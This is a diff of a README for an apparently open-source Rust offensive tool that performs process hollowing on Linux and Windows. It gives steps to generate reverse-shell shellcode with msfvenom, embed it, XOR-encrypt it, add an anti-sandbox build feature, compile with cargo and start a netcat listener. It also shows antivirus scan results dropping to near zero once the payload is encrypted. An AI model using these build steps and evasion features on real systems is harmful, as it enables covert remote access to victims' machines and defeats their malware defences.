@@ -18,17 +18,17 @@ Linux process hollowing functions a little differently. First, the executable cr
 1. [Not shown in GIF] Generate shellcode for the desired end result (for example, use [msfvenom](https://book.hacktricks.xyz/shells/shells/msfvenom) to generate a reverse TCP shell shellcode for the target operating system)
 2. [Not shown in GIF] Open [the config file](https://github.com/kmanc/remote_code_oxidation/blob/master/rco_config/src/lib.rs) 
 and change the shellcode to the shellcode generated in step 1
-3. [Optional] Encrypt the shellcode using [xor_shellcode](https://github.com/kmanc/remote_code_oxidation/blob/master/xor_shellcode) and update the encrypted shellcode value in [the config file](https://github.com/kmanc/remote_code_oxidation/blob/master/rco_config/src/lib.rs)  
-4. [Not shown in GIF] Compile the executable, only including `--features encrypted` if you did step 3
+3. [Optional] Encrypt the shellcode and target process using [xor_params](https://github.com/kmanc/remote_code_oxidation/blob/master/xor_shellcode) and update the encrypted shellcode value in [the config file](https://github.com/kmanc/remote_code_oxidation/blob/master/rco_config/src/lib.rs)  
+4. [Not shown in GIF] Compile the executable, only including `--features xor` if you did step 3
 
     #### Build for Linux target
     ```commandline
-    cargo build -p process_hollowing [--features encrypted] --release
+    cargo build -p process_hollowing [--features [xor][antisand]] --release
     ```
 
     #### Build for Windows target
     ```commandline
-    cargo build --target x86_64-pc-windows-gnu -p process_hollowing [--features encrypted] --release
+    cargo build --target x86_64-pc-windows-gnu -p process_hollowing [--features [xor][antisand]] --release
     ```
 5. Start a netcat listener on the attacking machine on the same port you configured the shellcode to connect to in step 1
     ```commandline
@@ -43,12 +43,12 @@ and change the shellcode to the shellcode generated in step 1
 
 <p align="center"> Linux </p>
 
-[Unencrypted - 7 / 40](https://kleenscan.com/scan_result/9f584f6ba01c5d4cd09db05ccfa0d0be592a9522eeaaae6b8fa2c4d4f9d86433) | [Encrypted with `--features encrypted` - 0 / 40](https://kleenscan.com/scan_result/d9087bca23d0a3d74f335f404e66233a0fe6bf8954cddbac86c1028d17e36410)
+[Unencrypted - 7 / 40](https://kleenscan.com/scan_result/9f584f6ba01c5d4cd09db05ccfa0d0be592a9522eeaaae6b8fa2c4d4f9d86433) | [Encrypted with `--features xor` - 0 / 40](https://kleenscan.com/scan_result/d9087bca23d0a3d74f335f404e66233a0fe6bf8954cddbac86c1028d17e36410)
 :-------------------------:|:-------------------------:
 ![image](https://user-images.githubusercontent.com/14863147/151746886-343dac24-da1f-447e-b4df-2c35036c09dc.png) | ![image](https://user-images.githubusercontent.com/14863147/151746865-0be49000-efff-4d14-a2e1-afb3bd601bb1.png)
 
 <p align="center"> Windows </p>
 
-[Unencrypted - 13 / 40](https://kleenscan.com/scan_result/bac19828b35032fd7fa41f9293823b18aca6372fbf606c5428df0ca931aea502) | [Encrypted with `--features encrypted` - 1 / 40](https://kleenscan.com/scan_result/23d6063cc9bf35222c9aa604cc258de8aa8fb40a1fb443bfc97c8cdcb6ec2ad5)
+[Unencrypted - 13 / 40](https://kleenscan.com/scan_result/bac19828b35032fd7fa41f9293823b18aca6372fbf606c5428df0ca931aea502) | [Encrypted with `--features xor` - 1 / 40](https://kleenscan.com/scan_result/23d6063cc9bf35222c9aa604cc258de8aa8fb40a1fb443bfc97c8cdcb6ec2ad5)
 :-------------------------:|:-------------------------:
 ![image](https://user-images.githubusercontent.com/14863147/151746908-58824664-8072-4ce3-8895-e01057b868a6.png) | ![image](https://user-images.githubusercontent.com/14863147/151746900-49ec8f35-6718-4ac7-83fe-5e67610ff4c0.png)
